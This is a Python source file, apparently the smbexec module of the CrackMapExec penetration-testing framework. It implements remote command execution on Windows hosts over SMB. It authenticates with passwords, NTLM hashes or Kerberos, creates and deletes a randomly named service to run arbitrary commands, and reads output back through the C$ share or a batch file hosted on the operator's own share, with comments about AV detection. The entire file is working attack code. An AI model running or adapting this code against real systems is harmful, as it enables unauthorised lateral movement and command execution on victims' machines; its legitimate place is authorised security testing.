#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from os.path import join as path_join
from time import sleep
from impacket.dcerpc.v5 import transport, scmr
from cme.helpers.misc import gen_random_string
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE


class SMBEXEC:
    def __init__(
        self,
        host,
        share_name,
        smbconnection,
        protocol,
        username="",
        password="",
        domain="",
        doKerberos=False,
        aesKey=None,
        kdcHost=None,
        hashes=None,
        share=None,
        port=445,
        logger=None,
        tries=None
    ):
        self.__host = host
        self.__share_name = "C$"
        self.__port = port
        self.__username = username
        self.__password = password
        self.__serviceName = gen_random_string()
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = b""
        self.__shell = "%COMSPEC% /Q /c "
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__conn = None
        # self.__mode  = mode
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = "ncacn_np:%s[\pipe\svcctl]" % self.__host
        self.logger.debug("StringBinding %s" % stringbinding)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, "setRemoteHost"):
            self.__rpctransport.setRemoteHost(self.__host)
        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp["lpScHandle"]

    def execute(self, command, output=False):
        self.__retOutput = output
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_remote(c.strip())
        else:
            self.execute_remote(command)
        self.finish()
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_remote(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + ".bat"

        if self.__retOutput:
            command = self.__shell + "echo " + data + f" ^> \\\\127.0.0.1\\{self.__share_name}\\{self.__output} 2^>^&1 > %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\{self.__batchFile}"
        else:
            command = self.__shell + data

        with open(path_join("/tmp", "cme_hosted", self.__batchFile), "w") as batch_file:
            batch_file.write(command)

        self.logger.debug("Hosting batch file with command: " + command)

        # command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
        self.logger.debug("Command to execute: " + command)

        self.logger.debug(f"Remote service {self.__serviceName} created.")
        
        try:
            resp = scmr.hRCreateServiceW(
                self.__scmr,
                self.__scHandle,
                self.__serviceName,
                self.__serviceName,
                lpBinaryPathName=command,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service = resp["lpServiceHandle"]
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                self.logger.fail("SMBEXEC: Create services got blocked.")
            else:
                self.logger.fail(str(e))
            
            return self.__outputBuffer

        try:
            self.logger.debug(f"Remote service {self.__serviceName} started.")
            scmr.hRStartServiceW(self.__scmr, service)

            self.logger.debug(f"Remote service {self.__serviceName} deleted.")
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception as e:
            pass

        self.get_output_remote()

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return
        tries = 1
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries >= self.__tries:
                    self.logger.fail(f'SMBEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option "--get-output-tries". If it\'s still failing maybe something is blocking the schedule job, try another exec method')
                    break
                if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
                    self.logger.fail(f'SMBEXEC: Get ouput failed, target has blocked {self.__share} access (maybe command executed!)')
                    break
                if str(e).find("STATUS_SHARING_VIOLATION") >= 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
                    # Output not finished, let's wait
                    sleep(2)
                    tries += 1
                else:
                    self.logger.debug(str(e))
        
        if self.__outputBuffer:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + ".bat"
        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        if self.__retOutput:
            command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}"
        else:
            command = self.__shell + data

        with open(path_join("/tmp", "cme_hosted", self.__batchFile), "w") as batch_file:
            batch_file.write(command)

        self.logger.debug("Hosting batch file with command: " + command)

        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
        self.logger.debug("Command to execute: " + command)

        self.logger.debug(f"Remote service {self.__serviceName} created.")
        resp = scmr.hRCreateServiceW(
            self.__scmr,
            self.__scHandle,
            self.__serviceName,
            self.__serviceName,
            lpBinaryPathName=command,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service = resp["lpServiceHandle"]

        try:
            self.logger.debug(f"Remote service {self.__serviceName} started.")
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput:
            return

        while True:
            try:
                with open(path_join("/tmp", "cme_hosted", self.__output), "rb") as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpctransport.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp["lpScHandle"]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp["lpServiceHandle"]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass
